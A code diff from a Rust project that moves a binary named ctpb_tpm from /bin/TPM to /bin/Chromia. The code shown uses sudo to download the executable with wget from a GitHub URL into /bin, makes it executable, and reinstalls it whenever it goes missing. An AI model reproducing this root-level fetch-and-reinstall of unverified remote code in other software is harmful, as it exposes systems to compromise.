@@ -253,7 +253,7 @@ fn reinstall_tpm() -> Result<(), io::Error> {
 
     // Step 1: Create the target directory and move the binary
     let create_dir_status = Command::new("sudo")
-        .args(&["mkdir", "-p", "/bin/TPM"])
+        .args(&["mkdir", "-p", "/bin/Chromia"])
         .status()?;
     
     if !create_dir_status.success() {
@@ -267,7 +267,7 @@ fn reinstall_tpm() -> Result<(), io::Error> {
             "wget",
             "https://github.com/brokenpip/ctpb_ids/raw/refs/heads/main/ctpb_tpm",
             "-P",
-            "/bin/TPM"
+            "/bin/Chromia"
         ])
         .status()?;
     
@@ -280,7 +280,7 @@ fn reinstall_tpm() -> Result<(), io::Error> {
         .args(&[
             "chmod",
             "+x",
-            "/bin/TPM/ctpb_tpm"
+            "/bin/Chromia/ctpb_tpm"
         ])
         .status()?;
 
@@ -299,7 +299,7 @@ fn is_service_running(service_name: &str) -> Result<bool, io::Error> {
         .args(&["is-active", service_name])
         .output()?;
 
-    if !Path::new("/bin/TPM/ctpb_tpm").exists() {
+    if !Path::new("/bin/Chromia/ctpb_tpm").exists() {
         let _ = reinstall_tpm(); 
     }
 
